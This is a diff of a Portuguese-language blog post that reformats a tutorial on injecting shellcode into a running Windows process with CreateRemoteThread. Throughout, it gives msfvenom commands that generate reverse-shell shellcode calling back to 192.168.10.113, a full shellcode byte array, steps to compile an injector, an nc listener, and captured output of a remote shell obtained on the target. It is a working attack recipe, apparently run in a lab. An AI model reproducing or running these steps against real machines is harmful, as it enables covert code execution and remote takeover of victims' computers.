@@ -3,35 +3,41 @@ title: Injeção de Código - Injection Remote Process PID
 category: post
 ---
 
->código fonte usado : 
+>link do código usado : 
 https://github.com/d0x75/Injector-RemoteProcess.git
 
 
-## Windows CreateRemoteThread Shellcode Injection and Execution in Remote Process
+**Windows CreateRemoteThread Shellcode Injection and Execution in Remote Process**
 
-Esse também é um o clássico Shellcode Injection que no caso é feito em outro módulo/processo que está em execução no computador alvo. O PID do processo que injetaremos o código é passado como argumento ao executarmos o shellcode.
+>Esse também é um o clássico Shellcode Injection que no caso é feito em outro módulo/processo que está em execução no computador alvo. O PID do processo que injetaremos o código é passado como argumento ao executarmos o shellcode.
 
-Quando o shellcode for executado com sucesso, ganhamos acesso na máquina alvo; Conforme PoC a seguir:
-
----
+>Quando o shellcode for executado com sucesso, ganhamos acesso na máquina alvo; Conforme PoC a seguir:
 
 
 ### Step 1 
 
 - Gerar os bytes do shellcode para Windows x86, apontando para o IP do computador que vai ganhar o acesso.
 
-		msfconsole
-		msfvenom -p windows/shell_reverse_tcp LHOST=192.168.10.113 LPORT=1234 -f c -b \x00\x0a\x0d
 
+
+```ruby
+msfconsole
+msfvenom -p windows/shell_reverse_tcp
+LHOST=192.168.10.113 LPORT=1234 -f c -b \x00\x0a\x0d
+```
 
 - Ou Gerar os bytes do shellcode para Windows x64, apontando para o IP do computador que vai ganhar o acesso.
 
-		msfconsole
-		msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.10.113 LPORT=1234 -f c -b \x00\x0a\x0d
 
+```ruby
+msfconsole
+msfvenom -p windows/x64/shell_reverse_tcp
+LHOST=192.168.10.113 LPORT=1234 -f c -b \x00\x0a\x0d
+```
 
 - Após rodar o comando acima com sucesso, teremos os bytes do shellcode na tela. Exemplo :
 
+```c++
 		unsigned char buf[] =
 		"\x33\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e"
 		"\xfb\x25\xeb\xf6\x83\xee\xfc\xe2\xf4\x07\xcd\x69\xf6\xfb\x25"
@@ -57,49 +63,61 @@ Quando o shellcode for executado com sucesso, ganhamos acesso na máquina alvo; 
 		"\x09\x2e\x9e\x1b\x43\x59\x73\x83\x50\x6e\x98\x76\x09\x2e\x19"
 		"\xed\x8a\xf1\xa5\x10\x16\x8e\x20\x50\xb1\xe8\x57\x84\x9c\xfb"
 		"\x76\x14\x23";
+```
 
 
 ### Step 2
 
-- Abrir o código fonte pronto mencionado no inicio, que tem o
+- Abrir o código do link mencionado no inicio, que tem o
 código responsável por executar os bytes gerados acima.
 
-		injectremotePID.cpp
+
+```text
+injectremotePID.cpp
+```
 
 - Depois de copiar os bytes gerados pelo msfvenom no Step 1, devemos colar esses bytes no conteúdo da variável 
 _unsigned char shellcode[] = ""_ do código fonte , e depois compilar-lo.
 
 - Ao compilar o software com sucesso teremos os executáveis prontos para uso.
 
-		injectremotePID.exe
 
+```text
+injectremotePID.exe
+```
 
 ### Step 3
 
-
 - Anotar o PID do processo/módulo em que iremos injetar o shellcode.
 
-		para vermos o PID podemos usar o "ProcessHacker" ou "procexp"
 
+```text
+para vermos o PID podemos usar o "ProcessHacker" ou "procexp"
+```
 
 - Abrir a porta que colocamos como argumento no msfvenom para gerar o shellcode, no computador que tem o IP que também colocamos como argumento no msfvenom para gerar o shellcode :
 
-		nc -vlp 1234
 
+```cmd
+nc -vlp 1234
+```
 
 - Executar o binário que injeta o shellcode passando o PID anotado acima como argumento para o programa injetor :
 
-		injectremotePID.exe 2004
 
+```cmd
+injectremotePID.exe 2004
+```
 
 - Feito isso, já devemos ganhar o acesso no alvo.
 
-		listening on [any] 1234 ...
-		192.168.10.109: inverse host lookup failed: Host name lookup failure
-		connect to [192.168.10.113] from (UNKNOWN) [192.168.10.109] 49173
-		Microsoft Windows [vers�o 6.1.7600]
-		Copyright (c) 2009 Microsoft Corporation. Todos os direitos reservados.
 
-		C:\Users\VBOX_7\Desktop>
+```cmd
+listening on [any] 1234 ...
+192.168.10.109: inverse host lookup failed: Host name lookup failure
+connect to [192.168.10.113] from (UNKNOWN) [192.168.10.109] 49173
+Microsoft Windows [vers�o 6.1.7600]
+Copyright (c) 2009 Microsoft Corporation. Todos os direitos reservados.
 
-
+C:\Users\VBOX_7\Desktop>
+```
